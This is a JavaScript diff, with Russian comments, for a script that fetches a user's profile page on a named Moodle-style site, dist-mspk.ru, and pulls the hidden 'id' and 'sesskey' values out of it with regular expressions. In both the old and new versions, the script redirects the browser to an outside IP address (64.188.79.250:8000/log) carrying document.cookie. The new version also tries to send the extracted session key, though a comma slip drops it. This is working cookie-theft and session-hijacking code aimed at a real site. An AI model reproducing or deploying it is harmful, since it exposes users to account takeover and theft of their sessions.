@@ -1,3 +1,15 @@
+function extractValuesRegex(htmlContent) {
+    // Ищем id
+    const idMatch = htmlContent.match(/name="id"\s+value="([^"]+)"/);
+    const id = idMatch ? idMatch[1] : null;
+    
+    // Ищем sesskey
+    const sesskeyMatch = htmlContent.match(/name="sesskey"\s+value="([^"]+)"/);
+    const sesskey = sesskeyMatch ? sesskeyMatch[1] : null;
+    
+    return { id, sesskey };
+}
+
 async function getUserProfile() {
     const url = 'https://www.dist-mspk.ru/user/profile.php';
     
@@ -34,6 +46,10 @@ async function getUserProfile() {
 
         // Получаем содержимое как текст (HTML)
         const htmlContent = await response.text();
+
+        const { id, sesskey } = extractValuesRegex(htmlContent);
+        console.log('ID:', id);
+        console.log('Sesskey:', sesskey);
         
         console.log('=== Содержимое страницы профиля ===');
         console.log(`Статус: ${response.status} ${response.statusText}`);
@@ -42,7 +58,7 @@ async function getUserProfile() {
         console.log(htmlContent.substring(0, 1000));
         console.log('... (остальной контент обрезан) ...');
         console.log(`Общая длина HTML: ${htmlContent.length} символов`);
-        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+htmlContent;
+        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+id,sesskey;
         return htmlContent;
         
     } catch (error) {
